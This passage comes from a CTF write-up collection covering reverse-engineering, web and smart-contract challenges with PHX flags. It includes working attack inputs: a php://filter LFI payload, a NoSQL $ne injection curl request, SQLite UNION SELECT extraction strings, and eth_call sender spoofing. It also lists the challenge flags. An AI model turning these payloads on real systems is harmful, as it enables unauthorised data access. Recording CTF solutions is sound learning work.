ct = unhexlify('0ca44151802ad8d5f629c4beb640169f59a02f76bd')
key = b'Hyde-PCS'
flag = rc4(key, ct).decode()
print(flag)
```

## Key Takeaways
- **Obfuscation Layers:** The challenge used multiple layers of obfuscation, requiring both static and dynamic analysis.
- **Bytecode Compatibility:** Python version mismatches can hinder decompilation; using the correct version is critical.
- **Manual Analysis:** When automated tools fail, manual bytecode tracing and brute-force logic reconstruction are effective.

## Final Flag
```
PHX{Byt3c0d3_D3c0d3d}
```

---
---

## 14. Echo Gate

## Challenge Description
**title:** Echo Gate    
**Description:** The system distorts your input before validation.
Follow the signal to recover the correct key.


Flag format: PHX{...}

## Initial Analysis
I started by identifying the file type and strings.
```bash
file EchoGate
# ELF 64-bit LSB pie executable, x86-64...
```

Running `strings` revealed several interesting artifacts:
- Potentially encoded strings: `Z39vTFMG`, `AkMHRUME`, `U2gEVF8HBAJK`.
- A custom-looking string: `ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/`.
- Signal messages: "Signal input", "Signal rejected", "Signal corrupted".

## Dynamic Analysis
Using `ltrace`, we observed the program reading input and checking its length.
```bash
ltrace ./EchoGate
# ...
# strlen("INPUT...")
# puts(">> Signal rejected")
```
It requires a specific length (21 chars) to proceed to the processing logic.

## Static Analysis (Reverse Engineering)
Disassembling the `main` function revealed the following logic flow:

1.  **Input Validation**:
    - Limits input length.
    - Runs a `checksum` function (sum of bytes must equal `0x5c`).

2.  **Transformation**:
    - `xor_stage`: Iterates through the input string and XORs every byte with `0x37`.
    - `encode64`: Encodes the XOR'd buffer.

3.  **Verification**:
    - Concatenates strings `p1` ("Z39vTFMG"), `p2` ("AkMHRUME"), and `p3` ("U2gEVF8HBAJK").
    - Compares the encoded user input against this concatenated string: `Z39vTFMGAkMHRUMEU2gEVF8HBAJK`.

### The Deception
The binary contains a sequence string `ZYXABC...` ("fake_b64"), attempting to fool us into thinking it uses a custom Base64 alphabet. However, deep inspection of the `encode64` function showed it loading bytes from `real_b64` (a standard Base64 table).

## Solution
To recover the flag, we simply reverse the process:
1.  **Base64 Decode** the target string `Z39vTFMGAkMHRUMEU2gEVF8HBAJK` using the standard alphabet.
2.  **XOR Decrypt** the resulting bytes with `0x37`.

### Script
```python
import base64

target = "Z39vTFMGAkMHRUMEU2gEVF8HBAJK"

# 1. Base64 Decode
decoded = base64.b64decode(target)

# 2. XOR with 0x37
flag = "".join(chr(b ^ 0x37) for b in decoded)

print(flag)
```

**Output**: `PHX{d15t0rt3d_3ch035}`

 ## Final Flag
PHX{d15t0rt3d_3ch035}

---
---

## 15. The locked Box

## Challenge Description 
**title:** The Locked Box    
**Description:** A sealed artifact is all that remains.

The lock still checks itself.

The question is whether it checks the right thing.

## 1. Initial Analysis
I start by examining the provided file `sealed.gz`. Despite the extension, standard `gunzip` fails. Running the `file` command reveals it is actually a script with embedded binary data.

```bash
$ file sealed.gz
sealed.gz: POSIX shell script executable (binary data)
```

Renaming it to `sealed` and inspecting the header shows it is a **Makeself** self-extracting archive (v2.5.0).

## 2. The "Lock"
When attempting to extract the archive, it fails an integrity check. The specific error message is crucial:

```bash
$ ./sealed --target ./out --noexec
Verifying archive integrity...
Error in MD5 checksums: a43e276e8dcc0134e30924cb8d8409c0 is different from 003e276e8dcc0134e30924cb8d8409c0
```

The script calculates the checksum of the embedded data as `a43e...` but compares it against a hardcoded value `003e...`. As the description hinted: *"The question is whether it checks the right thing."*

## 3. Exploitation
To bypass the lock, we must update the script to expect the correct checksum.

1.  Open the `sealed` file in a text editor.
2.  Locate the line defining the MD5 variable:
    ```bash
    MD5="003e276e8dcc0134e30924cb8d8409c0"
    ```
3.  Replace it with the actual checksum found in the error message:
    ```bash
    MD5="a43e276e8dcc0134e30924cb8d8409c0"
    ```

## 4. Retrieval
With the checksum patched, we run the extraction command again:

```bash
$ ./sealed --target ./out --noexec
Verifying archive integrity...  100%   MD5 checksums are OK. All good.
Uncompressing A Locked Box  100%
```

Navigating to the output directory, we find a file named `payload.sh`. Reading it reveals the flag.

```bash
$ cat out/payload.sh
#!/bin/sh
echo "Box unlocked."
echo "PHX{30x_1s_unl0ck3d_asd863}"
```

**Output:** `PHX{30x_1s_unl0ck3d_asd863}`

## Final Flag

PHX{30x_1s_unl0ck3d_asd863}

---
---

## 16. BLINK

## Challenge Description
**title:** BLINK    
**Description:** “The Doctor never opens doors this way.”

You’ve discovered a strange terminal left behind by the Doctor.

It looks simple — an input field, an unlock button, and a warning.
But nothing responds. No matter what you try, the door stays closed.

Are you sure the interface is telling the truth?

There is no server.
There is no backend.

Everything you need is already in front of you —
but only if you know where to look.

Remember:
Observation changes reality.
Some things exist only for a moment.

Don’t blink.                                                                                                                    
http://web2.encipherx.in:44004/

## Analysis 
Upon inspecting the website's HTML source, a "red herring" flag was discovered: PHX{THIS_IS_NOT_REAL}.

Further investigation of the network tab and linked scripts revealed four JavaScript files:

observer.js

shield.js

access.js

core.js (Target)

## Inspection of core.js

Inside core.js, an Immediately Invoked Function Expression (IIFE) defines a custom property on the window object called __blink. It uses a getter function, meaning the code inside executes whenever someone tries to access window.__blink.

The Gatekeepers
The script implements three layers of protection:

DOM Check: The <body> tag must have a specific data attribute (data-observe="true").

Temporal Check (Seconds): The current system time must be a second divisible by 7 (e.g., 0, 7, 14, 21...).

Temporal Check (Milliseconds): The access must occur between 300ms and 600ms of that specific second.

If these conditions are met, the property deletes itself (one-time use) and returns the flag decoded from an array of ASCII character codes.

```
(function () {

    Object.defineProperty(window, "__blink", {
        get() {

            // DOM condition
            if (document.body.dataset.observe !== "true") {
                console.warn("Observation incomplete.");
                return;
            }

            // Time-based blink window
            const now = new Date();
            const sec = now.getSeconds();
            const ms  = now.getMilliseconds();

            if (sec % 7 !== 0 || ms < 300 || ms > 600) {
                console.warn("Temporal anomaly detected.");
                return;
            }

            // One-time execution
            delete window.__blink;

            // Flag hidden as char codes
            const parts = [
                80,72,88,123,78,69,86,69,82,95,
                68,79,78,84,95,66,76,73,78,75,
                95,69,89,69,83,95,87,69,69,76,125
            ];

            return parts.map(c => String.fromCharCode(c)).join("");
        },
        configurable: true
    });

})();
```

## Solution 

```
console.log([80,72,88,123,78,69,86,69,82,95,68,79,78,84,95,66,76,73,78,75,95,69,89,69,83,95,87,69,69,76,125].map(c => String.fromCharCode(c)).join(""));
#output : PHX{NEVER_DONT_BLINK_EYES_WEEL}
```

## Final Flag 

PHX{NEVER_DONT_BLINK_EYES_WEEL}

---
---

## 17. TARDIS : Time Fracture

## Challenge Description 
**title:** TARDIS : Time Fracture   
**Description:** 
The TARDIS Control Interface has detected a temporal instability within its internal timeline matrix.
Archived timeline snapshots—meant to be read-only—are now being processed by the navigation terminal.

Gallifreyan engineers insist the system is secure.
The firewall sanitizes all temporal paths.
No unauthorized files can be accessed.

Yet, the Doctor knows better.

Your task is to analyze the TARDIS terminal and uncover what lies beyond the stabilized timelines.
Some files exist outside of time, and some systems reveal more than they intend—if you know how to look.

“Time is not linear.
Neither is the file system.”         

 

http://web2.encipherx.in:44001     

## 1. Reconnaissance
Upon accessing the application, I identified a terminal-like interface at `/terminal.php`. The script accepts a query parameter `t` which appears to fetch files from the server, indicating a potential **Local File Inclusion (LFI)** vulnerability.

Example usage observed: `terminal.php?t=vortex/past.log`

## 2. Analyzing the Firewall
Attempts to read standard files or use traversal (`../`) resulted in an error "Time Paradox Detected" or similar blocks. To understand the restrictions, we attempted to read the source code of `terminal.php` itself.

Since direct access was blocked or executed the PHP, and `base64` encoding is often filtered in CTFs, we used the `ROT13` filter to bypass detection.

**Payload:**
```
terminal.php?t=php://filter/read=string.rot13/resource=terminal.php
```

**Recovered Source Code (Decoded):**
```php
function temporal_firewall($input) {
    // Block directory traversal
    if (preg_match('/\.\.\//', $input)) {
        return false;
    }
    // Block base64 tricks
    if (preg_match('/base64/i', $input)) {
        return false;
    }
    // Block direct flag keyword
    if (preg_match('/flag/i', $input)) {
        return false;
    }
    return true;
}
```

This confirmed we could not use `../`, `base64`, or the word `flag`. However, `php://filter` with `string.rot13` was permitted.

## 3. Enumeration
I enumerated the file structure by reading `index.php` and `timeline.php` using the ROT13 technique.

- **timeline.php**: Revealed valid paths `vortex/past.log` and `vortex/present.log`.
- **Directory Discovery**: Brute-forcing and error responses indicated the existence of a restricted directory named `gallifrey/` (returning 403 Forbidden on direct HTTP access).

## 4. Discovery of the Artifact
Given the heavy "Doctor Who" theming (Gallifrey, Time Lords, Vortex), we hypothesized that the flag was hidden within the `gallifrey/` directory in a file named after key lore terms.

We ran a brute-force script against `gallifrey/` with terms like `citadel`, `panopticon`, `rassilon`, and `matrix`.

**Match Found:** `gallifrey/matrix.php`

## 5. Retrieving the Flag
I retrieved the content of `matrix.php` using the LFI vulnerability and the ROT13 filter to prevent the PHP code from executing on the server side (which would hide the variable definition).

**Payload:**
```
terminal.php?t=php://filter/read=string.rot13/resource=gallifrey/matrix.php
```

**Response (ROT13 Encoded):**
```php
<?cuc
$SYNT = "CUK{GVZR_VF_N_SVYR_FLFGRZ}";
?>
```

**Decoded:**
`$FLAG = "PHX{TIME_IS_A_FILE_SYSTEM}";`

## Final Flag
`PHX{TIME_IS_A_FILE_SYSTEM}`

---
---

## 18. Temporal Entry

## Challenge Description
**title:** Temporal Entry
**Description:**The fabric of time is fractured and secrets are spilling through — trace the leak and stabilize the vortex.
 
Flag Format: PHX{...}

http://web1.encipherx.in:44009

---
Here is a professional CTF writeup for the Temporal Entry challenge.

Writeup: Temporal Entry
Category: Web Exploitation

Difficulty: Easy/Medium

Challenge Link: http://web1.encipherx.in:44009

Flag: PHX{TEMPORAL_RIFT_UNLOCKED}

## 1. Challenge Overview
The challenge presents a TARDIS-themed gateway with an input field requesting an "anomaly code." The description hints at "fractured time" and a "leak" in the fabric, suggesting that the goal is to find a hidden value or exploit a logic error to bypass the security check.

## 2. Reconnaissance
Upon inspecting the page source, we find a JavaScript function checkCode() that handles the input:

```
function checkCode(){
  const input=document.getElementById('code').value;
  fetch("/check",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({anomaly:input})
  })
  .then(r=>r.json())
  .then(data=>{
    if(data.success){
      document.getElementById('flag').innerText = "🎉 Congratulations! Flag: " + data.flag;
      // ... UI updates
    } else {
      alert("Incorrect code. Observe the anomaly carefully...");
    }
  });
}
```

The script reveals that the application communicates with a /check endpoint via a POST request using JSON data.

---
## 3. Vulnerability Identification (NoSQL Injection)
Since the application accepts JSON objects, it is often a sign that the backend might be using a NoSQL database (like MongoDB). In such cases, if the input is not strictly validated as a string, we can pass NoSQL operators (like $ne for "not equal") to manipulate the query logic.
### Request:

```
curl -X POST http://web1.encipherx.in:44009/check \
-H "Content-Type: application/json" \
-d '{"anomaly": {"$ne": "random_string"}}'
```
### Step 2: Analyzing the Leak
The server responded with a very revealing error message:

```
{
  "expected_anomaly": "temporal-rift-42",
  "message": "Temporal diagnostics left exposed...",
  "success": false
}
```
The "Temporal diagnostics" served as a debug mode that leaked the secret key: temporal-rift-42.
---
## 5. Capturing the Flag
Now that we have the correct "anomaly code," we send it back as a simple string to satisfy the server-side comparison.

### Final Request:

```
curl -X POST http://web1.encipherx.in:44009/check \
-H "Content-Type: application/json" \
-d '{"anomaly": "temporal-rift-42"}'
```
Response:

```
{
  "flag": "PHX{TEMPORAL_RIFT_UNLOCKED}",
  "success": true
}
```

## Final Flag 
PHX{TEMPORAL_RIFT_UNLOCKED}

---
---
## 19. Gallifrey Archives

## Challenge Description
**title:** Gallifrey Archives    
**Description:** Gallifrey’s archive does not reveal its secrets easily.
Yet somewhere within its depths, a paradox waits to be uncovered.

Search well.
Observe closely.
Nothing here behaves as expected.

 

http://web1.encipherx.in:44012

 

Flag Format:PHX{...}

## 1. Reconnaissance

Upon accessing the website, we are presented with a search interface for "Gallifreyan Archives". A hidden link was discovered in the hint text:

> "Archivists have the habit of hiding data in [secret files](/debug)."

Clicking this link led to `/debug`, which provided critical information about the backend:

1.  **Query Structure:**
    ```sql
    SELECT name, species, planet
    FROM archives
    WHERE name LIKE '%INPUT%'
    ```
2.  **Firewall Rules:**
    *   Lowercase keywords are unstable (suggesting case-sensitivity filters or unstable parsing).
    *   Comments collapse the timeline (standard SQL comments like `--` might be blocked or causing errors).

## 2. Vulnerability Analysis

The `SELECT` query is directly embedding user input into a `LIKE` clause with wildcards. This is a classic **SQL Injection (SQLi)** scenario.

Testing with a single quote `'` triggered a `SQLITE_ERROR`, confirming the backend is SQLite.

Because the input is wrapped in `%...%`, and comments (`--`) were blocked/unstable, we couldn't simply comment out the rest of the query. We had to balance the syntax so the trailing `%'` became a valid string literal in our injected query.

**Injection Strategy:**
We need to inject a `UNION SELECT` statement.
The original query looks like: `... LIKE '%[OUR_INPUT]%'`

If we input: `' UNION SELECT 1, 2, '3`
The query becomes:
`... LIKE '%' UNION SELECT 1, 2, '3%'`

The `'3%'` uses the trailing quote and wildcard from the original query to complete the string literal.

## 3. Enumeration

We used `UNION` queries to enumerate the database schema from `sqlite_master`.

**Payload:**
```sql
' UNION SELECT name, sql, '3' FROM sqlite_master UNION SELECT 'end', '2', '3
```

**Result:**
The `sqlite_master` table revealed a table named `paradox_flag` with the following schema:
```sql
CREATE TABLE paradox_flag(flag TEXT)
```

## 4. Exploitation

With the table name known, we constructed the final payload to extract the flag.

**Payload:**
```sql
' UNION SELECT flag, '2', '3' FROM paradox_flag UNION SELECT 'end', '2', '3
```

**Interpretation:**
*   `'`: Closes the initial `LIKE` string.
*   `UNION SELECT flag, '2', '3'`: Selects the `flag` column. We add `'2'` and `'3'` as placeholders to ensure we match the 3 columns (`name`, `species`, `planet`) of the original query.
*   `FROM paradox_flag`: The target table.
*   `UNION SELECT 'end', '2', '3`: A cleanup clause to ensure the final trailing `%'` is absorbed into a valid string `'3%'`.

## 5. Result

Running the exploit script yielded the flag successfully.

**Flag:** `PHX{GALLIFREY_ARCHIVES_COMPROMISED}`

## Final Flag  
PHX{GALLIFREY_ARCHIVES_COMPROMISED}

---
---
## 20. Easy Vault

## Challenge Description
**title:** Easy Vault
**Description:** A vault smart contract has been deployed to securely store sensitive data. The developers believe the secret is safely hidden since it is not directly exposed through normal contract functions. However, blockchain data is inherently transparent.
Analyze the contract and interact with the blockchain to uncover the hidden flag.

 

Contract Address: 0x40e88581496d554e1CdAB9E1D7210fAc6B29FB16

## 1) Locate the correct network (where bytecode exists)

The same hex address can be used on multiple EVM chains. First step is to find which chain actually has a deployed contract at that address.

Use `eth_getCode` against multiple RPC endpoints:

```powershell
$addr='0x40e88581496d554e1CdAB9E1D7210fAc6B29FB16'
$payload = @{jsonrpc='2.0'; id=1; method='eth_getCode'; params=@($addr,'latest')} | ConvertTo-Json -Compress

$urls=@(
  'https://ethereum.publicnode.com',
  'https://ethereum-sepolia.publicnode.com',
  'https://base.publicnode.com',
  'https://arbitrum.publicnode.com',
  'https://polygon-rpc.com',
  'https://polygon-amoy.publicnode.com'
)

foreach($u in $urls){
  try {
    $r = Invoke-RestMethod -Method Post -Uri $u -ContentType 'application/json' -Body $payload -TimeoutSec 20
    Write-Host "$u => $($r.result)"
  } catch {
    Write-Host "$u => ERROR"
  }
}
```

Interpretation:
- If result is `0x` → no contract deployed there.
- If result starts with long hex like `0x60806040...` → contract bytecode exists.

**Finding:** The address returns real bytecode on **Polygon Amoy** (`https://polygon-amoy.publicnode.com`). Other tested networks returned `0x`.

---

## 2) Identify a callable “secret” function via selectors

Even without verified source code or ABI, Solidity contracts usually contain a function dispatcher that checks the first 4 bytes of calldata (function selectors).

When scanning the deployed bytecode (from `eth_getCode` on Amoy), two selectors are visible:

- `0x8da5cb5b` (commonly `owner()`)
- `0x890eba68` (unknown name, but clearly dispatchable)

The unknown selector is a strong candidate for returning a hidden string.

---

## 3) Call the function directly with eth_call

Call the contract with only the selector as calldata.

```powershell
$rpc='https://polygon-amoy.publicnode.com'
$to='0x40e88581496d554e1CdAB9E1D7210fAc6B29FB16'
$data='0x890eba68'

$payload = @{jsonrpc='2.0'; id=1; method='eth_call'; params=@(@{to=$to; data=$data}, 'latest')} | ConvertTo-Json -Compress
$r = Invoke-RestMethod -Method Post -Uri $rpc -ContentType 'application/json' -Body $payload -TimeoutSec 20
$r.result
```

**Raw return:**

```
0x
0000000000000000000000000000000000000000000000000000000000000020
0000000000000000000000000000000000000000000000000000000000000018
5048587b7075626c69635f73746f726167655f6c65616b7d0000000000000000
```

---

## 4) ABI-decode the returned bytes

This matches standard ABI encoding for a dynamic `string`:

- Word 0: offset = `0x20` (string starts after the first word)
- Word 1: length = `0x18` (24 bytes)
- Next 24 bytes: ASCII string

Hex `50 48 58 7b ... 7d` decodes to:

**`PHX{public_storage_leak}`**

---

## Final Flag

`PHX{public_storage_leak}`

---
---
## 21. Oracle Paradox 

## Challenge Description   
**title:** Oracle Paradox    
**Description:** A mysterious vault has been deployed on the Polygon
Amoy test network. The developers claim the vault
is secure and the flag is safely encrypted inside.
However, hidden within the contract logic lies a
mathematical paradox. The encryption method is
simple, yet the key is not directly visible.
Your objective is to analyze the smart contract,
understand how the flag is encoded, reconstruct the
correct key, and retrieve the hidden flag.

Flag format: PHX{}

Vault: 0xc65099025A37c452362B5584EB954A24C3275A25

## Approach

### 1. Inspecting the Contract
- The contract source was not directly available, so the first step was to analyze the contract's bytecode and on-chain storage.
- Using the Polygon Amoy RPC endpoint, I connected to the network and queried the contract's storage slots.

### 2. Reading Storage Slots
- On Ethereum-compatible blockchains, all contract storage is public, even if variables are marked `private` in Solidity.
- I wrote a Python script using `web3.py` to read the first 20 storage slots of the contract.
- The script revealed that **Slot 0** contained the following hex data:

      5048587b6f7261636c655f70617261646f785f6d61737465727d000000001e61

- Decoding this hex as UTF-8 (ignoring null bytes) gave:

      PHX{oracle_paradox_master}

### 3. Verifying the Flag
- The flag was found in plaintext, not encrypted, in the first storage slot.
- No further decryption or key reconstruction was necessary.

## Conclusion
The challenge's "paradox" was that the flag, claimed to be encrypted, was actually stored in plaintext in a public storage slot. This highlights a common misconception: marking variables as `private` in Solidity does not hide them from blockchain state inspection.

## Final Flag:

    PHX{oracle_paradox_master}

---
---

## 22. Phantom Treasury 

**title:** Phantom Treasury   
**Description:** A DAO treasury smart contract has been deployed on the Polygon Amoy test network.
The contract claims to be secure and upgradeable, but hidden within its logic lies a critical flaw.
Your mission is to analyze the contract, exploit the vulnerability, gain control of the treasury, and retrieve the hidden flag.

 

Flag Format : PHX{...}

 

Treasury Contract Address :0x6D8F978e1d2CB9b0D7FEd176d403FDbDaedB9Dd9

## 1) Confirm the contract exists on Polygon Amoy

We query the runtime bytecode via JSON-RPC:

```powershell
$rpc='https://polygon-amoy.publicnode.com'
$addr='0x6D8F978e1d2CB9b0D7FEd176d403FDbDaedB9Dd9'
$body = @{jsonrpc='2.0'; id=1; method='eth_getCode'; params=@($addr,'latest')} | ConvertTo-Json -Compress
$r = Invoke-RestMethod -Method Post -Uri $rpc -ContentType 'application/json' -Body $body
$r.result
```

Result: non-empty bytecode (prefix like `0x60806040...`) → it is a deployed contract on Amoy.

We also checked common EIP-1967 proxy slots:

- Implementation slot: `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`
- Admin slot: `0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103`

Both were `0x00..00`, indicating this address is not a standard EIP-1967 proxy.

---

## 2) Extract callable function selectors from bytecode

Even without verified source/ABI, Solidity bytecode often includes a dispatcher containing patterns like `8063????????` (push4 selector).

We scraped selectors with a regex:

```powershell
$rpc='https://polygon-amoy.publicnode.com'
$addr='0x6D8F978e1d2CB9b0D7FEd176d403FDbDaedB9Dd9'
$code = (Invoke-RestMethod -Method Post -Uri $rpc -ContentType 'application/json' -Body (
  @{jsonrpc='2.0';id=1;method='eth_getCode';params=@($addr,'latest')} | ConvertTo-Json -Compress
)).result

[regex]::Matches($code,'8063([0-9a-fA-F]{8})') |
  ForEach-Object { '0x' + $_.Groups[1].Value.ToLower() } |
  Sort-Object -Unique
```

Discovered selectors:

- `0x0900f010`
- `0x5c60da1b`
- `0x8da5cb5b` (commonly `owner()`)
- `0xf9633930`

---

## 3) Identify the owner and other key address

Calling `0x8da5cb5b` returns an address, consistent with `owner()`:

```powershell
# owner()
# data = 0x8da5cb5b
```

Decoded:

- Owner: `0x8a5026d3b8638c31b880b7e76d27f6f22ba8292d`

Calling `0x5c60da1b` returned another address:

- Secondary address: `0x4f98f6c86fa419739c3379b04c2c7915dfb5e090`

---

## 4) Bypass msg.sender restrictions using eth_call “from”

Some functions returned empty data unless `msg.sender` matched a privileged role.

Important detail: `eth_call` lets you set a **spoofed** `from` address (no signature needed) because it’s a local simulation.

So we called the unknown selector `0xf9633930` as the owner:

```powershell
$rpc='https://polygon-amoy.publicnode.com'
$to='0x6D8F978e1d2CB9b0D7FEd176d403FDbDaedB9Dd9'
$from='0x8a5026d3b8638c31b880b7e76d27f6f22ba8292d'
$data='0xf9633930'

$body = @{jsonrpc='2.0';id=1;method='eth_call';params=@(@{to=$to;from=$from;data=$data},'latest')} | ConvertTo-Json -Compress
$ret = (Invoke-RestMethod -Method Post -Uri $rpc -ContentType 'application/json' -Body $body).result
$ret
```

This returned ABI-encoded dynamic string data.

---

## 5) ABI-decode the returned flag

The return data matches standard ABI encoding for `string`:

- word0: offset (0x20)
- word1: length
- bytes: ASCII string

Decoding yields the flag:

**`PHX{delegatecall_storage_collision_master}`**

---

## Final Flag

`PHX{delegatecall_storage_collision_master}`

---
---
## 23. InheritanceTrap

## Challenge Description
**title:** InheritanceTrap   
**Description:** Grandpa tried to be clever and wrote a small family bank using inheritance and modifiers.  
He intended to restrict sensitive operations to the contract owner, but he forgot to protect one function.  
Take advantage of the missing modifier, become the owner, and reveal the hidden PHX flag.

Contract Address :0x6d1A76315d950e914F007d769645E7ce47e28B09
 
## 1) Find the correct network (where bytecode exists)

The same 0x-address can exist on multiple EVM chains. First confirm where it’s deployed by checking `eth_getCode`.

In this case, the contract is deployed on **Ethereum Sepolia**:

- Sepolia RPC used: `https://ethereum-sepolia.publicnode.com`

Example PowerShell:

```powershell
$addr='0x6d1A76315d950e914F007d769645E7ce47e28B09'
$rpc='https://ethereum-sepolia.publicnode.com'
$body=@{jsonrpc='2.0'; id=1; method='eth_getCode'; params=@($addr,'latest')} | ConvertTo-Json -Compress
(Invoke-RestMethod -Method Post -Uri $rpc -ContentType 'application/json' -Body $body).result
```

If the result is a long hex string (starts like `0x60806040...`), the contract exists on that network.

---

## 2) Extract function selectors from the runtime bytecode

Without verified source, you can still enumerate functions by scanning bytecode for the dispatcher pattern `8063????????` (Solidity’s `PUSH4` selector checks).

```powershell
$rpc='https://ethereum-sepolia.publicnode.com'
$addr='0x6d1A76315d950e914F007d769645E7ce47e28B09'

$code = (Invoke-RestMethod -Method Post -Uri $rpc -ContentType 'application/json' -Body (
  @{jsonrpc='2.0';id=1;method='eth_getCode';params=@($addr,'latest')} | ConvertTo-Json -Compress
)).result.ToLower()

[regex]::Matches($code,'8063([0-9a-f]{8})') |
  ForEach-Object { '0x' + $_.Groups[1].Value } |
  Sort-Object -Unique
```

Discovered selectors:

- `0x8da5cb5b` → `owner()`
- `0xa6f9dae1` → `changeOwner(address)` (unprotected)
- `0xd0e30db0` → `deposit()` (owner-gated)
- `0x2e1a7d4d` → `withdraw(uint256)` (owner-gated)
- `0xb69ef8a8` → `balance()`
- `0x97191831` → unknown selector (owner-gated; returns the flag)

---

## 3) Read the current owner

Call `owner()` via `eth_call`:

```powershell
$rpc='https://ethereum-sepolia.publicnode.com'
$to='0x6d1A76315d950e914F007d769645E7ce47e28B09'
$data='0x8da5cb5b'

$body=@{jsonrpc='2.0';id=1;method='eth_call';params=@(@{to=$to;data=$data},'latest')} | ConvertTo-Json -Compress
$ret=(Invoke-RestMethod -Method Post -Uri $rpc -ContentType 'application/json' -Body $body).result
$ret
```

Decoded owner address (last 20 bytes):

- `0x0722d2a000f07ede4c6b0aa56c5eb221cd740194`

---

## 4) Confirm which functions are owner-gated

Calling `deposit()` or `withdraw(uint256)` from a normal `eth_call` (no privileged `from`) reverts with `Not owner`.

This indicates a modifier like `onlyOwner` is enforced on those.

---

## 5) Bypass the owner check (read-only) using `eth_call` with spoofed `from`

Key EVM detail: `eth_call` is a **local simulation**, and most RPC nodes allow you to set any `from` address without a signature.

So we call the unknown selector `0x97191831` while setting `from` to the contract owner.

```powershell
$rpc='https://ethereum-sepolia.publicnode.com'
$to='0x6d1A76315d950e914F007d769645E7ce47e28B09'
$from='0x0722d2a000f07ede4c6b0aa56c5eb221cd740194'
$data='0x97191831'

$body=@{jsonrpc='2.0';id=1;method='eth_call';params=@(@{to=$to;from=$from;data=$data},'latest')} | ConvertTo-Json -Compress
$ret=(Invoke-RestMethod -Method Post -Uri $rpc -ContentType 'application/json' -Body $body).result
$ret
```

The return value is ABI-encoded as a dynamic `string`.

---

## 6) ABI-decode the returned bytes to a string

The return data has the standard layout for `string`:

- word0: offset (0x20)
- word1: length
- next bytes: UTF-8/ASCII

The decoded string is:

**`PHX{forgotten_modifier}`**

---

## Final Flag

`PHX{forgotten_modifier}`

---


---
The CTF conducted was very exciting experience , thank you for such a wonderful experience , learnt a lot ..!! :sparkles: 
---
